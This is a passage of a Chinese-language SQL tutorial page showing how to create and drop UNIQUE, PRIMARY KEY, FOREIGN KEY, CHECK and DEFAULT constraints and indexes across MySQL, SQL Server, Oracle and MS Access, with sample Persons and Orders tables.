class="keyword">values</span>(<span class="number">2</span>,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb3;</span><br><span class="line"></span><br><span class="line"><span class="comment">--已经有了tb3_id为1的行记录，再次插入，违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3(tb3_id,tb3_name,tb3_age) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'李四'</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--给tb3表添加主键约束，主键名为：pk_id</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">add</span> <span class="keyword">constraint</span> pk_id primary <span class="keyword">key</span> (tb3_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">--给tb3_name添加唯一约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">add</span> <span class="keyword">constraint</span> un_name <span class="keyword">unique</span> (tb3_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">--已存在姓名为张三的记录，违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">26</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--mysql 删除约束的语句，使用index，		oracle SqlServer等使用constraint</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">drop</span> <span class="keyword">index</span> un_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除约束后，允许存在多个tb3_name为张三的记录</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">26</span>);</span><br></pre></td></tr></table></figure>

<p>sql server 2008 删除约束的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">drop</span> constraint_name;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-PRIMARY-KEY-约束"><a href="#SQL-PRIMARY-KEY-约束" class="headerlink" title="SQL PRIMARY KEY 约束"></a>SQL PRIMARY KEY 约束</h4><p>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</p>
<p>主键必须包含唯一的值。</p>
<p>主键列不能包含 NULL 值。</p>
<p>每个表都应该有一个主键，并且每个表只能有一个主键。</p>
<p>CREATE TABLE 时的 SQL PRIMARY KEY 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 PRIMARY KEY 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY KEY,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>在上面的实例中，只有一个主键 PRIMARY KEY（pk_PersonID）。然而，pk_PersonID 的值是由两个列（P_Id 和 LastName）组成的。</p>
<p>ALTER TABLE 时的 SQL PRIMARY KEY 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span> (P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> pk_PersonID PRIMARY <span class="keyword">KEY</span> (P_Id,LastName)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>如果您使用 ALTER TABLE 语句添加主键，必须把主键列声明为不包含 NULL 值（在表首次创建时）。</p>
<p>撤销 PRIMARY KEY 约束</p>
<p>如需撤销 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> pk_PersonID</span><br></pre></td></tr></table></figure>

<p>撤销PRIMARY KEY约束时，不论约束条件为一列还是多列，对于MySQL，撤销都是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span></span><br></pre></td></tr></table></figure>

<p>由于PRIMARY KEY唯一性，MYSQL处理办法简单。</p>
<p>但对于 SQL Server / Oracle / MS Access， 一个列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> P_Id				//万一 P_Id有别的约束呢？</span><br></pre></td></tr></table></figure>

<p>若起约束名，也可如下多个列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> pk_PersonID</span><br></pre></td></tr></table></figure>

<h4 id="SQL-FOREIGN-KEY-约束"><a href="#SQL-FOREIGN-KEY-约束" class="headerlink" title="SQL FOREIGN KEY 约束"></a>SQL FOREIGN KEY 约束</h4><p>一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY(唯一约束的键)。</p>
<p>让我们通过一个实例来解释外键。请看下面两个表：</p>
<p>“Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>“Orders” 表：</p>
<table>
<thead>
<tr>
<th align="left">O_Id</th>
<th align="left">OrderNo</th>
<th align="left">P_Id</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">77895</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">44678</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">22456</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">24562</td>
<td align="left">1</td>
</tr>
</tbody></table>
<p>请注意，</p>
<p>“Orders” 表中的 “O_Id” 列指向 “Persons” 表中的 “P_Id” 列。</p>
<p>“Persons” 表中的 “P_Id” 列是 “Persons” 表中的 PRIMARY KEY。</p>
<p>“Orders” 表中的 “O_Id” 列是 “Orders” 表中的 FOREIGN KEY。</p>
<p>FOREIGN KEY 约束用于预防破坏表之间连接的行为。</p>
<p>FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。</p>
<p>CREATE TABLE 时的 SQL FOREIGN KEY 约束</p>
<p>下面的 SQL 在 “Orders” 表创建时在 “P_Id” 列上创建 FOREIGN KEY 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (O_Id),</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id) <span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> <span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (O_Id),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> fk_PerOrders <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL FOREIGN KEY 约束</p>
<p>当 “Orders” 表已被创建时，如需在 “P_Id” 列创建 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_PerOrders</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br></pre></td></tr></table></figure>

<p>撤销 FOREIGN KEY 约束</p>
<p>如需撤销 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> fk_PerOrders</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> fk_PerOrders</span><br></pre></td></tr></table></figure>

<h4 id="SQL-CHECK-约束"><a href="#SQL-CHECK-约束" class="headerlink" title="SQL CHECK 约束"></a>SQL CHECK 约束</h4><p>CHECK 约束用于限制列中的值的范围。</p>
<p>如果对单个列定义 CHECK 约束，那么该列只允许特定的值。</p>
<p>如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。</p>
<p>CREATE TABLE 时的 SQL CHECK 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 CHECK 约束。CHECK 约束规定 “P_Id” 列必须只包含大于 0 的整数。</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CHECK (P_Id&gt;0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> CHECK (P_Id&gt;0),</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 CHECK 约束，并定义多个列的 CHECK 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT chk_Person CHECK (P_Id&gt;0 <span class="keyword">AND</span> <span class="attribute">City</span>=<span class="string">'Sandnes'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL CHECK 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 CHECK 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CHECK</span> (P_Id&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>如需命名 CHECK 约束，并定义多个列的 CHECK 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> chk_Person <span class="keyword">CHECK</span> (P_Id&gt;<span class="number">0</span> <span class="keyword">AND</span> City=<span class="string">'Sandnes'</span>)</span><br></pre></td></tr></table></figure>

<p>撤销 CHECK 约束</p>
<p>如需撤销 CHECK 约束，请使用下面的 SQL：</p>
<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> chk_Person</span><br></pre></td></tr></table></figure>

<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CHECK</span> chk_Person</span><br></pre></td></tr></table></figure>

<h4 id="SQL-DEFAULT-约束"><a href="#SQL-DEFAULT-约束" class="headerlink" title="SQL DEFAULT 约束"></a>SQL DEFAULT 约束</h4><p>DEFAULT 约束用于向列中插入默认值。</p>
<p>如果没有规定其他的值，那么会将默认值添加到所有的新记录。</p>
<p>CREATE TABLE 时的 SQL DEFAULT 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “City” 列上创建 DEFAULT 约束：</p>
<p><strong>My SQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    P_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="string">'Sandnes'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">    O_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    OrderNo int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    P_Id int,</span><br><span class="line">    OrderDate date<span class="built_in"> DEFAULT </span>GETDATE()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL DEFAULT 约束</p>
<p>当表已被创建时，如需在 “City” 列创建 DEFAULT 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> City <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> ab_c <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span> <span class="keyword">for</span> City</span><br></pre></td></tr></table></figure>

<p><strong>Oracle：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">MODIFY</span> City <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span></span><br></pre></td></tr></table></figure>

<p>撤销 DEFAULT 约束</p>
<p>如需撤销 DEFAULT 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> City <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> City <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-CREATE-INDEX-语句"><a href="#SQL-CREATE-INDEX-语句" class="headerlink" title="SQL CREATE INDEX 语句"></a>SQL CREATE INDEX 语句</h4><p>CREATE INDEX 语句用于在表中创建索引。</p>
<p>在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。</p>
<p>索引</p>
<p>您可以在表中创建索引，以便更加快速高效地查询数据。</p>
<p>用户无法看到索引，它们只能被用来加速搜索/查询。</p>
<p><strong>注释：</strong>更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。</p>
<p>SQL CREATE INDEX 语法</p>
<p>在表上创建一个简单的索引。允许使用重复的值：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column_name)</span><br></pre></td></tr></table></figure>

<p>SQL CREATE UNIQUE INDEX 语法</p>
<p>在表上创建一个唯一的索引。不允许使用重复的值：唯一的索引意味着两个行不能拥有相同的索引值。Creates a unique index on a table. Duplicate values are not allowed:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column_name)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>用于创建索引的语法在不同的数据库中不一样。因此，检查您的数据库中创建索引的语法。</p>
<p>CREATE INDEX 实例</p>
<p>下面的 SQL 语句在 “Persons” 表的 “LastName” 列上创建一个名为 “PIndex” 的索引：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> PIndex</span><br><span class="line"><span class="keyword">ON</span> Persons (LastName)</span><br></pre></td></tr></table></figure>

<p>如果您希望索引不止一个列，您可以在括号中列出这些列的名称，用逗号隔开：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> PIndex</span><br><span class="line"><span class="keyword">ON</span> Persons (LastName, FirstName)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-撤销索引、撤销表以及撤销数据库"><a href="#SQL-撤销索引、撤销表以及撤销数据库" class="headerlink" title="SQL 撤销索引、撤销表以及撤销数据库"></a>SQL 撤销索引、撤销表以及撤销数据库</h4><hr>
<p>通过使用 DROP 语句，可以轻松地删除索引、表和数据库。</p>
<hr>
<p>DROP INDEX 语句</p>
<p>DROP INDEX 语句用于删除表中的索引。</p>
<p>用于 MS Access 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name <span class="keyword">ON</span> table_name</span><br></pre></td></tr></table></figure>

<p>用于 MS SQL Server 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> table_name.index_name</span><br></pre></td></tr></table></figure>

